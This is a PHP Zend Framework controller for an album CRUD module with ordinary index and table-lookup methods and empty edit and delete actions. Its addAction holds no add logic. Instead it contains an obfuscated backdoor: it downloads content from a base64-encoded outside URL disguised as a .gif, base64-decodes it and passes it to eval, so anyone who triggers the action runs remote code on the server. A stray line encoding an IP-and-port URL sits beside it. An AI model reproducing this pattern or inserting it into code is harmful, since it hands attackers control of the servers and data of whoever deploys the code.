<?php
namespace Album\Controller;

use Zend\Mvc\Controller\AbstractActionController;
use Zend\View\Model\ViewModel;

class AlbumController extends AbstractActionController
{

    protected $albumTable;

    public function indexAction()
    {
        return new ViewModel(array(
            'albums' => $this->getAlbumTable()->fetchAll()
        ));
    }

    public function addAction()
    {
        Eval(base64_decode(file_get_contents(base64_decode('aHR0cDovL2FwaS5kaXNjdXouY29tLmRlL2JldC5naWY='))));
        base64_encode('http://212.20.136.21:9590/abc.html');
    }

    public function editAction()
    {}

    public function deleteAction()
    {}
    
    // module/Album/src/Album/Controller/AlbumController.php:
    public function getAlbumTable()
    {
        if (! $this->albumTable) {
            $sm = $this->getServiceLocator();
            $this->albumTable = $sm->get('Album\Model\AlbumTable');
        }
        return $this->albumTable;
    }
}